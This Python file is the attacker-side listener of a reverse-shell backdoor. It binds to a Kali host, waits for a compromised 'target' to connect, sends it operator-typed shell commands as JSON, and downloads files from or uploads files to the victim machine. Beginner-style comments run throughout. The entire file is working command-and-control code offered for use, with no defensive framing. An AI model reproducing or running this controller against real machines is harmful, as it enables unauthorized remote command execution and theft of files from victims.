import socket
import json
import os

# bind connection opening port and listening to connections
kali_ip = '192.168.0.8'
kali_port = 5555

def target_communic(): 
    while True:
        # initiate a command
        command = input('* Shell~%s: ' % str(ip))
        # send command
        reliable_send(command)
        # quit program
        if command == 'quit': 
            break
        elif command[:3] == 'cd ':
            pass 
        elif command == 'clear':
            os.system('clear')
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            # receives the response from the target when running our command
            result = reliable_receiv()
            print(result)

def download_file(filename):
    f = open(filename, 'wb')
    # so that our program does not crash
    chunk = target.recv(1024)
    target.settimeout(1)
    while chunk: 
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def upload_file(filename): 
    f = open(filename, 'rb')
    target.send(f.read())

def reliable_send(data):
    # data is our command and parses it to json
    jsonData = json.dumps(data)
    # send actual data, once sending data over sockets we need to encode it
    target.send(jsonData.encode())

def reliable_receiv():
    data = ''
    while True:
        try:
            # byte we want to receive (1024) from our target
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# to make a connection with IP (AF_INET) over TCP (SOCK_STREAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bind ip address and port
sock.bind((kali_ip, kali_port))

# start listeing for incoming connections
print('[+++++] Listening for the incoming connections [+++++]')

#listen up to 5 different connections
sock.listen(5)

# we need to store the connection
# accept the incoming connection and storing the target and ip
target, ip = sock.accept()

# Once connection is established
print('[+++++] Target connected from: ' + str(ip))

# communication with target
target_communic()